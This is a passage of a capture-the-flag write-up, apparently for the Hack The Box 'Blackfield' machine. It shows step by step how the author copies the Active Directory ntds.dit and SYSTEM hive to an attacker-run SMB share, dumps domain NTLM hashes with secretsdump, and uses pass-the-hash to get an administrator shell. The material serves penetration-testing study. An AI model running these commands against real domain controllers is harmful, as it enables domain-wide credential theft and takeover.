    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre> -------------------------------------------------------------------------------                                      
 ROBOCOPY     ::     Robust File Copy for Windows
 -------------------------------------------------------------------------------                                      

 Started : Friday, December 23, 2022 7:31:52 AM
 Source : z:\windows\ntds\                              
     Dest : C:\Temp\                                      

     Files : ntds.dit                                      

 Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

 ------------------------------------------------------------------------------                                       

                         1    z:\windows\ntds\
             New File              18.0 m        ntds.dit
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Send <code class="language-plaintext highlighter-rouge">ntds</code> from Windows machine to Linux machine.
In Linux machine create a share name mine is  <code class="language-plaintext highlighter-rouge">sec</code> and path  mine is <code class="language-plaintext highlighter-rouge">.</code> for more explanation check at <a href="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html">0xdf</a>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/exploit]
â””â”€$ impacket-smbserver sec . -smb2support -u  gems -password gems
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>In Windows machine</p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt;  net use \\10.10.14.5\sec /u:gems gems                                                     
*Evil-WinRM* PS C:\Temp&gt; copy ntds.dit \\10.10.14.5\sec 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>We are now in the possession of the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and we need to extract the system hive. This can be done with a simple reg save command as shown below
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Temp&gt; reg save hklm\system c:\Temp\system                                                         
The operation completed successfully.
</pre></td></tr></tbody></table></code></pre></div>    </div>

    <p><strong>Send to Linux machine</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> *Evil-WinRM* PS C:\Temp&gt; copy system  \\10.10.14.5\sec
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>Alternatively you can use <code class="language-plaintext highlighter-rouge">upload</code> and <code class="language-plaintext highlighter-rouge">download</code> command to transfer files.</p>
  </li>
  <li>On our Kali Linux shell, we can use the <code class="language-plaintext highlighter-rouge">secretsdump</code> script that is a part of the <code class="language-plaintext highlighter-rouge">Impacket</code> Framework to extract our hashes from the <code class="language-plaintext highlighter-rouge">ntds.dit</code>file and the system hive</li>
</ol>

<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/Machines/vip/blackfield/exploit]
â””â”€$ impacket-secretsdump -ntds ntds.dit -system system local  
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                                                                                                   

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                                                                                                                                                              
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                              
[*] Searching for pekList, be patient                                                                                                                                                                                                      
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                                                                                                                                          
[*] Reading and decrypting hashes from ntds.dit                                                                                                                                                                                            
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                                                                                                                                                     
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                      
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:3774928fe55833e6c62abdc233f47a7b:::                                     
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                                     
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::                                 
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                                   
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::         
[...]
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We can use Pass-The-Hash again with the adminâ€™s hash, get a shell and read the <code class="language-plaintext highlighter-rouge">root.txt flag</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/blackfield]
â””â”€$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Root flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt
4375a629c7c67c*******************
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Mungu Nisaidie
</pre></td></tr></tbody></table></code></pre></div></div>
:ET